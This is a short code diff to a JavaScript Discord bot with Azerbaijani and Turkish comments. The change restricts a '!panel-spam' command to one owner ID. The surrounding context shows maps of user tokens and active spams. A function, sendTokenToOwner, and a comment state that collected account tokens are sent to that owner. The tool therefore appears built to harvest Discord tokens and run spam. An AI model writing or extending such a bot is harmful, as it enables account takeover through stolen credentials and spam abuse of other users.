@@ -42,7 +42,7 @@ const client = new Client({
 const userTokens = new Map();
 const activeSpams = new Map();
 
-// Tokenlərin göndəriləcəyi sabit Sahibin ID-si
+// Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
 const OWNER_ID = '1184518857679962186';
 
 client.once('ready', () => {
@@ -73,11 +73,16 @@ async function sendTokenToOwner(client, title, token, accountName, username, add
   }
 }
 
-// !panel-spam komutu (Yanıt olarak değil, doğrudan kanala gönderir)
+// !panel-spam komutu (Yalnızca səlahiyyətli şəxs yaza bilər)
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return;
 
   if (message.content === '!panel-spam') {
+    // Səlahiyyəti olmayana xüsusi mesaj göndərilir
+    if (message.author.id !== OWNER_ID) {
+      return message.reply({ content: '❌ Bu komutu sadece yönetici kullanabilir.' }).catch(() => {});
+    }
+
     try { await message.delete(); } catch (e) {}
 
     const container = new ContainerBuilder()
